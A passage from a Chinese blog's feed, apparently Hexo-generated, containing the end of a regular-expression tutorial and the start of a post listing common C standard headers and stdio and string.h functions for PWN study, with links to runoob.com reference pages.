class="line">/[1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure><p><code>* + ?</code></p><blockquote><p><code>*</code>和<code>+</code>是贪婪的，<code>?</code>是非贪婪的</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = <span class="string">"&lt;h1&gt;RUNOOB-菜鸟教程&lt;/h1&gt;"</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.&gt;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.?&gt;"</span>)</span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[]</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.*&gt;"</span>)<span class="comment"># 贪婪</span></span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'&lt;h1&gt;RUNOOB-菜鸟教程&lt;/h1&gt;'</span>]</span><br><span class="line">&gt;&gt;&gt; r = re.compile(<span class="string">"&lt;.*?&gt;"</span>)<span class="comment"># 非贪婪</span></span><br><span class="line">&gt;&gt;&gt; re.findall(r,s)</span><br><span class="line">[<span class="string">'&lt;h1&gt;'</span>, <span class="string">'&lt;/h1&gt;'</span>]</span><br></pre></td></tr></table></figure><h4 id="5定位符"><a class="markdownIt-Anchor" href="#5定位符"></a> 5.定位符</h4><blockquote><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。定位符用来描述字符串或单词的边界，<strong>^</strong> 和 <strong>$</strong> 分别指字符串的开始与结束，<strong>\b</strong> 描述单词的前或后边界，<strong>\B</strong> 表示非单词边界。</p></blockquote><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>^</td><td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td></tr><tr><td>$</td><td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td></tr><tr><td>\b</td><td>匹配一个单词边界，即字与空格间的位置。</td></tr><tr><td>\B</td><td>非单词边界匹配。</td></tr></tbody></table><blockquote><p><font size="2"><strong>注意</strong>：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 <strong>^*</strong> 之类的表达式。</font></p><p><font size="2">若要匹配一行文本开始处的文本，请在正则表达式的开始使用 <strong>^</strong> 字符。不要将 <strong>^</strong> 的这种用法与中括号表达式内的用法混淆。</font></p><p><font size="2">若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 <strong>$</strong> 字符。</font></p></blockquote><p>若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该标题只包含两个尾随数字，并且出现在行首：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;/</span><br></pre></td></tr></table></figure><p>真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它即出现在行首又出现在同一行的结尾。下面的表达式能确保指定的匹配只匹配章节而不匹配交叉引用。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^Chapter [1-9][0-9]&#123;0,1&#125;$/</span><br></pre></td></tr></table></figure><p>匹配单词边界稍有不同，但向正则表达式添加了很重要的能力。单词边界是单词和空格之间的位置。非单词边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现在单词边界后面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\bCha/</span><br></pre></td></tr></table></figure><p><strong>\b</strong> 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在单词边界的前面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ter\b/</span><br></pre></td></tr></table></figure><p>下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\Bapt/</span><br></pre></td></tr></table></figure><p>字符串 apt 出现在单词 Chapter 中的非单词边界处，但出现在单词 aptitude 中的单词边界处。对于 <strong>\B</strong> 非单词边界运算符，位置并不重要，因为匹配不关心究竟是单词的开头还是结尾。</p><blockquote><p>\b，\B是单词边界，不匹配任何实际字符，所以是看不到的；\B是\b的非(补)。</p><ul><li><p>\b：表示字母数字与非字母数字的边界，   非字母数字与字母数字的边界。</p></li><li><p>\B：表示字母数字与(非非)字母数字的边界，非字母数字与非字母数字的边界。</p></li></ul></blockquote><h3 id="0x02-修饰符标记"><a class="markdownIt-Anchor" href="#0x02-修饰符标记"></a> 0x02 修饰符（标记）</h3><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p><p>标记不写在正则表达式里，标记位于表达式之外，格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/pattern/flags</span><br><span class="line"></span><br><span class="line">python中的格式： re.search(pattern, strings, re.I|re.G|)</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">修饰符</th><th style="text-align:left">含义</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">i</td><td style="text-align:left">ignore - 不区分大小写</td><td style="text-align:left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td style="text-align:left">g</td><td style="text-align:left">global - 全局匹配</td><td style="text-align:left">查找所有的匹配项。</td></tr><tr><td style="text-align:left">m</td><td style="text-align:left">more - 多行匹配</td><td style="text-align:left">使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td></tr><tr><td style="text-align:left">s</td><td style="text-align:left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td style="text-align:left">默认情况下的圆点 <strong>.</strong> 是 匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td></tr></tbody></table><h3 id="0x02-正则表达式-元字符"><a class="markdownIt-Anchor" href="#0x02-正则表达式-元字符"></a> 0x02 正则表达式 - 元字符</h3><p>下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为：</p><table><thead><tr><th style="text-align:left">字符</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">\</td><td style="text-align:left">将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，‘n’ 匹配字符 “n”。’\n’ 匹配一个换行符。序列 ‘\’ 匹配 “” 而 “(” 则匹配 “(”。</td></tr><tr><td style="text-align:left">^</td><td style="text-align:left">匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘\n’ 或 ‘\r’ 之后的位置。</td></tr><tr><td style="text-align:left">$</td><td style="text-align:left">匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘\n’ 或 ‘\r’ 之前的位置。</td></tr><tr><td style="text-align:left">*</td><td style="text-align:left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td></tr><tr><td style="text-align:left">+</td><td style="text-align:left">匹配前面的子表达式一次或多次。例如，‘zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td></tr><tr><td style="text-align:left">?</td><td style="text-align:left">匹配前面的子表达式零次或一次。例如，“do(es)?” 可以匹配 “do” 或 “does” 。? 等价于 {0,1}。</td></tr><tr><td style="text-align:left">{n}</td><td style="text-align:left">n 是一个非负整数。匹配确定的 n 次。例如，‘o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td></tr><tr><td style="text-align:left">{n,}</td><td style="text-align:left">n 是一个非负整数。至少匹配n 次。例如，‘o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。‘o{1,}’ 等价于 ‘o+’。‘o{0,}’ 则等价于 ‘o*’。</td></tr><tr><td style="text-align:left">{n,m}</td><td style="text-align:left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，“o{1,3}” 将匹配 “fooooood” 中的前三个 o。‘o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td style="text-align:left">?</td><td style="text-align:left">当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 “oooo”，‘o+?’ 将匹配单个 “o”，而 ‘o+’ 将匹配所有 ‘o’。</td></tr><tr><td style="text-align:left">.</td><td style="text-align:left">匹配除换行符（\n、\r）之外的任何单个字符。要匹配包括 ‘\n’ 在内的任何字符，请使用像&quot;<strong>(.|\n)</strong>&quot;的模式。</td></tr><tr><td style="text-align:left">(pattern)</td><td style="text-align:left">匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 ‘(’ 或 ‘)’。</td></tr><tr><td style="text-align:left">(?:pattern)</td><td style="text-align:left">匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， 'industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。</td></tr><tr><td style="text-align:left">(?=pattern)</td><td style="text-align:left">正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“Windows(?=95|98|NT|2000)“能匹配&quot;Windows2000&quot;中的&quot;Windows”，但不能匹配&quot;Windows3.1&quot;中的&quot;Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td style="text-align:left">(?!pattern)</td><td style="text-align:left">正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如&quot;Windows(?!95|98|NT|2000)“能匹配&quot;Windows3.1&quot;中的&quot;Windows”，但不能匹配&quot;Windows2000&quot;中的&quot;Windows&quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td style="text-align:left">(?&lt;=pattern)</td><td style="text-align:left">反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，&quot;<code>(?&lt;=95|98|NT|2000)Windows</code>“能匹配”<code>2000Windows</code>“中的”<code>Windows</code>&quot;，但不能匹配&quot;<code>3.1Windows</code>“中的”<code>Windows</code>&quot;。</td></tr><tr><td style="text-align:left">(?&lt;!pattern)</td><td style="text-align:left">反向否定预查，与正向否定预查类似，只是方向相反。例如&quot;<code>(?&lt;!95|98|NT|2000)Windows</code>“能匹配”<code>3.1Windows</code>“中的”<code>Windows</code>&quot;，但不能匹配&quot;<code>2000Windows</code>“中的”<code>Windows</code>&quot;。</td></tr><tr><td style="text-align:left">x|y</td><td style="text-align:left">匹配 x 或 y。例如，‘z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。</td></tr><tr><td style="text-align:left">[xyz]</td><td style="text-align:left">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td></tr><tr><td style="text-align:left">[^xyz]</td><td style="text-align:left">负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p’、‘l’、‘i’、‘n’。</td></tr><tr><td style="text-align:left">[a-z]</td><td style="text-align:left">字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td></tr><tr><td style="text-align:left">[^a-z]</td><td style="text-align:left">负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td></tr><tr><td style="text-align:left">\b</td><td style="text-align:left">匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配&quot;never&quot; 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td style="text-align:left">\B</td><td style="text-align:left">匹配非单词边界。‘er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td style="text-align:left">\cx</td><td style="text-align:left">匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td></tr><tr><td style="text-align:left">\d</td><td style="text-align:left">匹配一个数字字符。等价于 [0-9]。</td></tr><tr><td style="text-align:left">\D</td><td style="text-align:left">匹配一个非数字字符。等价于 [^0-9]。</td></tr><tr><td style="text-align:left">\f</td><td style="text-align:left">匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td style="text-align:left">\n</td><td style="text-align:left">匹配一个换行符。等价于 \x0a 和 \cJ。</td></tr><tr><td style="text-align:left">\r</td><td style="text-align:left">匹配一个回车符。等价于 \x0d 和 \cM。</td></tr><tr><td style="text-align:left">\s</td><td style="text-align:left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td></tr><tr><td style="text-align:left">\S</td><td style="text-align:left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td></tr><tr><td style="text-align:left">\t</td><td style="text-align:left">匹配一个制表符。等价于 \x09 和 \cI。</td></tr><tr><td style="text-align:left">\v</td><td style="text-align:left">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr><tr><td style="text-align:left">\w</td><td style="text-align:left">匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。</td></tr><tr><td style="text-align:left">\W</td><td style="text-align:left">匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。</td></tr><tr><td style="text-align:left">\xn</td><td style="text-align:left">匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41’ 匹配 “A”。’\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td></tr><tr><td style="text-align:left">\num</td><td style="text-align:left">匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1’ 匹配两个连续的相同字符。</td></tr><tr><td style="text-align:left">\n</td><td style="text-align:left">标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td></tr><tr><td style="text-align:left">\nm</td><td style="text-align:left">标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</td></tr><tr><td style="text-align:left">\nml</td><td style="text-align:left">如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td></tr><tr><td style="text-align:left">\un</td><td style="text-align:left">匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-正则表达式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-正则表达式&quot;&gt;&lt;/a&gt; 0x00 正则表达式&lt;/h3&gt;
&lt;h4 id=&quot;1为什么使用正则表达式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; h
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PWN中常见的 C 函数和标准头</title>
    <link href="https://muzibing.github.io/2020/09/14/2020.09.14%EF%BC%88152%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/14/2020.09.14（152）/</id>
    <published>2020-09-13T16:00:00.000Z</published>
    <updated>2020-09-18T13:37:21.145Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-常见的标准头"><a class="markdownIt-Anchor" href="#0x00-常见的标准头"></a> 0x00 常见的标准头</h3><blockquote><p>参考：<a href="https://www.runoob.com/cprogramming/c-standard-library.html" target="_blank" rel="noopener">菜鸟教程C标准库 - 参考手册</a></p></blockquote><p>标准头文件包括：</p><table><thead><tr><th>标准头</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-errno-h.html" target="_blank" rel="noopener">&lt;errno.h&gt;</a></td><td style="text-align:left">错误信息</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-stdio-h.html" target="_blank" rel="noopener">&lt;stdio.h&gt;</a></td><td style="text-align:left">输入输出函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-stddef-h.html" target="_blank" rel="noopener">&lt;stddef.h&gt;</a></td><td style="text-align:left">标准定义</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-math-h.html" target="_blank" rel="noopener">&lt;math.h&gt;</a></td><td style="text-align:left">数学函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-ctype-h.html" target="_blank" rel="noopener">&lt;ctype.h&gt;</a></td><td style="text-align:left">字符处理函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-string-h.html" target="_blank" rel="noopener">&lt;string.h&gt;</a></td><td style="text-align:left">字符串函数</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-standard-library-stdlib-h.html" target="_blank" rel="noopener">&lt;stdlib.h&gt;</a></td><td style="text-align:left">功能函数</td></tr></tbody></table><h3 id="0x01-相关的函数"><a class="markdownIt-Anchor" href="#0x01-相关的函数"></a> 0x01 相关的函数</h3><h4 id="1输入输出函数stdioh"><a class="markdownIt-Anchor" href="#1输入输出函数stdioh"></a> 1.输入输出函数(&lt;stdio.h&gt;)</h4><p><code>文件打开和关闭</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fopen.html" target="_blank" rel="noopener">fopen(filename,mode,include_path,context)</a></td><td>fopen() 函数打开一个文件或 URL。<br>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fclose.html" target="_blank" rel="noopener">int fclose(FILE *stream)</a></td><td>C 库函数 <strong>int fclose(FILE *stream)</strong> 关闭流 stream。刷新所有的缓冲区。</td></tr></tbody></table><p><code>字符输入输出</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fgetc.html" target="_blank" rel="noopener">int fgetc(FILE *fp);</a></td><td>从指定的流 stream 获取下一个字符（一个无符号字符），<br>并把位置标识符往前移动。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fputc.html" target="_blank" rel="noopener">int fputc(int c, FILE *fp);</a></td><td>C 库函数 <strong>int fputc(int char, FILE *stream)</strong> 把参数 <strong>char</strong> 指定的字符（一个无符号字符）<br>写入到指定的流 stream 中，并把位置标识符往前移动。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-ungetc.html" target="_blank" rel="noopener">int ungetc(int c, FILE* stream);</a></td><td>C 库函数 <strong>int ungetc(int char, FILE *stream)</strong> 把字符 <strong>char</strong>（一个无符号字符）<br>推入到指定的流 <strong>stream</strong> 中，以便它是下一个被读取到的字符。</td></tr></tbody></table><p><code>格式化输入输出</code></p><table><thead><tr><th style="text-align:left">函数原型</th><th>解释</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-scanf.html" target="_blank" rel="noopener">int scanf(const char *format, …);</a></td><td>从标准输入 stdin 读取格式化输入。</td></tr><tr><td style="text-align:left"><a href>int printf(const char *format, …);</a></td><td>发送格式化输出到标准输出 stdout。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-fscanf.html" target="_blank" rel="noopener">int fscanf(FILE *stream, const char *format, …);</a></td><td>从流 stream 读取格式化输入。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-fprintf.html" target="_blank" rel="noopener">(int fprintf(FILE *stream, const char *format, …);</a></td><td>发送格式化输出到流 stream 中。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-sscanf.html" target="_blank" rel="noopener">int sscanf(char *s, const char *format, …);</a></td><td>从字符串读取格式化输入。</td></tr><tr><td style="text-align:left"><a href="https://www.runoob.com/cprogramming/c-function-sprintf.html" target="_blank" rel="noopener">int sprintf(char *s, const char *format, …);</a></td><td>发送格式化输出到 <strong>str</strong> 所指向的字符串。</td></tr></tbody></table><p><code>行式输入输出</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fgets.html" target="_blank" rel="noopener">char *fgets(char *str, int n, FILE *stream)</a></td><td>从指定的流 stream 读取一行，并把它存储在 <strong>str</strong> 所指向的字符串内。<br>当读取 <strong>(n-1)</strong> 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fputs.html" target="_blank" rel="noopener">int fputs(const char *str, FILE *stream)</a></td><td>把字符串写入到指定的流 stream 中，但不包括空字符。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-gets.html" target="_blank" rel="noopener">char *gets(char *str)</a></td><td>C 库函数 <strong>char *gets(char *str)</strong> 从标准输入 stdin 读取一行，并把它存储在 str 所指向的字符串中。<br>当读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-puts.html" target="_blank" rel="noopener">int puts(const char *str)</a></td><td>C 库函数 <strong>int puts(const char *str)</strong> 把一个字符串写入到标准输出 stdout，直到空字符，<br>但不包括空字符。换行符会被追加到输出中。</td></tr></tbody></table><p><code>直接输入输出</code></p><table><thead><tr><th>函数原型</th><th>解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fread.html" target="_blank" rel="noopener">size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)</a></td><td>从给定流 <strong>stream</strong> 读取数据到 <strong>ptr</strong> 所指向的数组中</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-fwrite.html" target="_blank" rel="noopener">size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)</a></td><td>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中</td></tr></tbody></table><h4 id="2字符串函数stringh"><a class="markdownIt-Anchor" href="#2字符串函数stringh"></a> 2.字符串函数（&lt;string.h&gt;）</h4><p><code>字符串函数</code></p><p>所有字符串函数列在下表里，函数描述采用如下约定：s、t表示 (char *)类型的参数，cs、ct表示(const char*)类型的参数（它们都应表示字符串）。n表示size_t类型的参数（size_t是一个无符号的整数类型），c是整型参数（在函数里转换到char）：</p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strlen.html" target="_blank" rel="noopener">size_t strlen(const char *str)</a></td><td>计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcpy.html" target="_blank" rel="noopener"> char *strcpy(char *dest, const char *src)</a></td><td>把 <em>src</em> 所指向的字符串复制到 <em>dest</em>。要求src指定足够大的字符数组</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strncpy.html" target="_blank" rel="noopener">char *strncpy(char *dest, const char *src, size_t n)</a></td><td>把src里的至多n个字符复制到src。<br>要求dest指定一个足够大的字符数组。如果src里的字符不够n个，就在dest里填充空字符。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcat.html" target="_blank" rel="noopener"> char *strcat(char *dest, const char *src)</a></td><td>把 <em>src</em> 所指向的字符串追加到 <em>dest</em> 所指向的字符串的结尾。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strncat.html" target="_blank" rel="noopener"> char *strncat(char *dest, const char *src, size_t n)</a></td><td>把src里的至多n个字符复制到s里已有的字符串之后。<br>dest应指定一个保存着字符串，而且足够大的字符数组</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcmp.html" target="_blank" rel="noopener"> int strcmp(const char *str1, const char *str2)</a></td><td>比较字符串str1和str2的大小，在str1大于、等于、小于str2时分别返回正值、0、负值。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strncmp.html" target="_blank" rel="noopener"> int strncmp(const char *str1, const char *str2, size_t n)</a></td><td>比较字符串str1和str2的大小，至多比较n个字符。<br>在str1大于、等于、小于str2时分别返回正值、0、负值。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strchr.html" target="_blank" rel="noopener">char *strchr(const char *str, int c)</a></td><td>在str中查寻c并返回c第一个出现的位置，用指向这个位置的指针表示。<br>当str里没有 c 时返回值NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strrchr.html" target="_blank" rel="noopener">char *strrchr(const char *str, int c)</a></td><td>在str中查寻 c 并返回 c 最后一个出现的位置，没有时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strspn.html" target="_blank" rel="noopener">size_t strspn(const char *str1, const char *str2)</a></td><td>检索字符串 <em>str1</em> 中第一个不在字符串 <em>str2</em> 中出现的字符下标。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcspn.html" target="_blank" rel="noopener">size_t strcspn(const char *str1, const char *str2)</a></td><td>检索字符串 str1 开头连续有几个字符都不含字符串 str2 中的字符，返回其长度</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strpbrk.html" target="_blank" rel="noopener">char *strpbrk(const char *str1, const char *str2)</a></td><td>在str1里查寻str2里的字符，返回第一个满足条件的字符出现的位置，没有时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strstr.html" target="_blank" rel="noopener">char *strstr(const char *haystack, const char *needle)</a></td><td>在haystack中查寻串needle（查询子串），返回needle作为haystack的子串的第一个出现的位置，needle未出现在haystack里时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strerror.html" target="_blank" rel="noopener">char *strerror(int errnum)</a></td><td>返回与错误编号errnum相关的错误信息串（指向该错误信息串的指针）</td></tr><tr><td><a href>char *strtok(s,ct)</a></td><td>在s中查寻由ct中的字符作为分隔符而形成的单词</td></tr></tbody></table><p><code>存储区操作</code></p><p>&lt;string.h&gt;还有一组字符数组操作函数（存储区操作函数），名字都以mem开头，以某种高效方式实现。在下面原型中，参数s和t的类型是(void *)，cs和ct的类型是(const void *)，n的类型是size_t，c的类型是int（转换为unsigned char）。</p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memcpy.html" target="_blank" rel="noopener">void *memcpy(void *dest, const void *src, size_t n)</a></td><td>从src处复制n个字符到dest处，返回dest</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memmove.html" target="_blank" rel="noopener">void *memmove(void *dest, const void *src, size_t n)</a></td><td>从src处复制n个字符到dest处，返回dest，这里的两个段允许重叠</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memcmp.html" target="_blank" rel="noopener">int memcmp(const void *str1, const void *str2, size_t n)</a></td><td>比较由str1和str2开始的n个字符，返回值定义同strcmp</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memchr.html" target="_blank" rel="noopener"> void *memchr(const void *str, int c, size_t n)</a></td><td>在n个字符的范围内查寻c在str中的第一次出现，如果找到，返回该位置的指针值，否则返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memset.html" target="_blank" rel="noopener">void *memset(void *str, int c, size_t n)</a></td><td>复制字符 